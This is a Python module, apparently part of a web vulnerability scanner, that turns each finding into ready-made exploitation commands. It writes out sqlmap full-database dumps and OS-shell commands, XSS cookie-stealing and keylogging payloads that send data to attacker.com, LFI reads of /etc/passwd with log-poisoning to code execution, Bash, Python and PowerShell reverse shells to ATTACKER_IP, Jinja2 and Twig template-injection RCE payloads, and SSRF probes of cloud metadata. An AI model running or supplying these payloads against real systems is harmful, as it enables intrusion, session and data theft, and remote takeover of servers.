from urllib.parse import urlparse, parse_qs, urlencode
from modules.core import console


def suggest_sqli_exploit(finding):
    """Generate SQLMap exploitation command for SQLi findings."""
    url = finding.get("url", "")
    payload = finding.get("payload", "")
    method = finding.get("method", "GET")
    param = finding.get("parameter", "")

    suggestions = []

    if method == "POST":
        form_data = finding.get("form_data", "")
        suggestions.append({
            "tool": "SQLMap (POST)",
            "command": f'sqlmap -u "{url}" --data="{form_data}" --dbs --batch --random-agent',
            "description": "Dump all databases via POST injection"
        })
        suggestions.append({
            "tool": "SQLMap (Full Dump)",
            "command": f'sqlmap -u "{url}" --data="{form_data}" --dump-all --batch --random-agent',
            "description": "Dump all tables and data"
        })
    else:
        suggestions.append({
            "tool": "SQLMap (GET)",
            "command": f'sqlmap -u "{url}" --dbs --batch --random-agent',
            "description": "Dump all databases via GET injection"
        })
        suggestions.append({
            "tool": "SQLMap (Full Dump)",
            "command": f'sqlmap -u "{url}" --dump-all --batch --random-agent',
            "description": "Dump all tables and data"
        })
        if param:
            suggestions.append({
                "tool": "SQLMap (Targeted)",
                "command": f'sqlmap -u "{url}" -p "{param}" --dbs --level=5 --risk=3 --batch',
                "description": f"Target specific parameter: {param}"
            })

    suggestions.append({
        "tool": "SQLMap (OS Shell)",
        "command": f'sqlmap -u "{url}" --os-shell --batch --random-agent',
        "description": "Attempt OS command execution via SQL injection"
    })

    return suggestions


def suggest_xss_exploit(finding):
    """Generate XSS exploitation PoC."""
    url = finding.get("url", "")
    payload = finding.get("payload", "")
    param = finding.get("parameter", "")

    suggestions = []

    suggestions.append({
        "tool": "Cookie Stealer PoC",
        "command": f'<script>new Image().src="https://attacker.com/steal?c="+document.cookie</script>',
        "description": "Steal session cookies via reflected XSS"
    })
    suggestions.append({
        "tool": "Keylogger PoC",
        "command": '<script>document.onkeypress=function(e){new Image().src="https://attacker.com/log?k="+e.key}</script>',
        "description": "Capture keystrokes on the vulnerable page"
    })
    suggestions.append({
        "tool": "XSStrike",
        "command": f'xsstrike -u "{url}" --crawl',
        "description": "Advanced XSS scanner with WAF bypass"
    })
    suggestions.append({
        "tool": "dalfox",
        "command": f'dalfox url "{url}" --blind https://attacker.bxss.me',
        "description": "Automated XSS scanner with blind XSS support"
    })

    return suggestions


def suggest_lfi_exploit(finding):
    """Generate LFI exploitation commands."""
    url = finding.get("url", "")

    suggestions = []
    suggestions.append({
        "tool": "LFI (etc/passwd)",
        "command": f'curl -s "{url}?file=../../../etc/passwd"',
        "description": "Read system password file"
    })
    suggestions.append({
        "tool": "LFI (PHP Filter)",
        "command": f'curl -s "{url}?file=php://filter/convert.base64-encode/resource=index.php"',
        "description": "Read PHP source code via filter wrapper"
    })
    suggestions.append({
        "tool": "LFI to RCE (Log Poisoning)",
        "command": f'curl -A "<?php system(\\$_GET[\'cmd\\\']); ?>" "{url}" && curl "{url}?file=/var/log/apache2/access.log&cmd=id"',
        "description": "Log poisoning to achieve Remote Code Execution"
    })

    return suggestions


def suggest_rce_exploit(finding):
    """Generate RCE exploitation commands."""
    url = finding.get("url", "")

    suggestions = []
    suggestions.append({
        "tool": "Reverse Shell (Bash)",
        "command": "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1",
        "description": "Bash reverse shell — replace ATTACKER_IP"
    })
    suggestions.append({
        "tool": "Reverse Shell (Python)",
        "command": 'python3 -c \'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh"])\'',
        "description": "Python reverse shell — replace ATTACKER_IP"
    })
    suggestions.append({
        "tool": "Reverse Shell (PowerShell)",
        "command": 'powershell -nop -c "$c=New-Object Net.Sockets.TCPClient(\'ATTACKER_IP\',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$s.Write(([text.encoding]::ASCII.GetBytes($r)),0,$r.Length)}"',
        "description": "PowerShell reverse shell for Windows targets"
    })
    suggestions.append({
        "tool": "Netcat Listener",
        "command": "nc -lvnp 4444",
        "description": "Start listener on your machine first"
    })

    return suggestions


def suggest_ssti_exploit(finding):
    """Generate SSTI exploitation payloads."""
    suggestions = []
    suggestions.append({
        "tool": "Jinja2 RCE",
        "command": "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
        "description": "Jinja2 Server-Side Template Injection to RCE"
    })
    suggestions.append({
        "tool": "Twig RCE",
        "command": "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
        "description": "Twig SSTI to RCE"
    })
    suggestions.append({
        "tool": "tplmap",
        "command": f'tplmap -u "{finding.get("url", "")}" --os-shell',
        "description": "Automated SSTI exploitation tool"
    })

    return suggestions


def suggest_ssrf_exploit(finding):
    """Generate SSRF exploitation commands."""
    url = finding.get("url", "")
    suggestions = []
    suggestions.append({
        "tool": "AWS Metadata",
        "command": f'curl "{url}?url=http://169.254.169.254/latest/meta-data/"',
        "description": "Access AWS EC2 instance metadata"
    })
    suggestions.append({
        "tool": "Internal Port Scan",
        "command": f'curl "{url}?url=http://127.0.0.1:PORT/"',
        "description": "Scan internal ports via SSRF"
    })

    return suggestions


VULN_SUGGEST_MAP = {
    "SQL Injection": suggest_sqli_exploit,
    "sqli": suggest_sqli_exploit,
    "SQLi": suggest_sqli_exploit,
    "XSS": suggest_xss_exploit,
    "Cross-Site Scripting": suggest_xss_exploit,
    "xss": suggest_xss_exploit,
    "Reflected XSS": suggest_xss_exploit,
    "Stored XSS": suggest_xss_exploit,
    "DOM XSS": suggest_xss_exploit,
    "LFI": suggest_lfi_exploit,
    "Local File Inclusion": suggest_lfi_exploit,
    "lfi": suggest_lfi_exploit,
    "RCE": suggest_rce_exploit,
    "Remote Code Execution": suggest_rce_exploit,
    "rce": suggest_rce_exploit,
    "Command Injection": suggest_rce_exploit,
    "SSTI": suggest_ssti_exploit,
    "Server-Side Template Injection": suggest_ssti_exploit,
    "ssti": suggest_ssti_exploit,
    "SSRF": suggest_ssrf_exploit,
    "Server-Side Request Forgery": suggest_ssrf_exploit,
    "ssrf": suggest_ssrf_exploit,
}


def get_exploit_suggestions(finding):
    """Get exploit suggestions for a finding based on its vulnerability type."""
    vuln_type = finding.get("type", finding.get("vulnerability", ""))
    suggest_fn = VULN_SUGGEST_MAP.get(vuln_type)
    if suggest_fn:
        return suggest_fn(finding)
    return []


def format_suggestions_console(suggestions):
    """Print exploit suggestions to console."""
    if not suggestions:
        return
    console.print("\n  [bold red]⚡ EXPLOITATION SUGGESTIONS:[/bold red]")
    for s in suggestions:
        console.print(f"    [bold yellow]{s['tool']}:[/bold yellow] {s['description']}")
        console.print(f"    [dim]$ {s['command'][:120]}[/dim]")
        console.print()


def enrich_findings_with_exploits(findings):
    """Add exploit suggestions to a list of findings."""
    enriched = []
    for finding in findings:
        suggestions = get_exploit_suggestions(finding)
        if suggestions:
            finding['exploit_suggestions'] = suggestions
        enriched.append(finding)
    return enriched
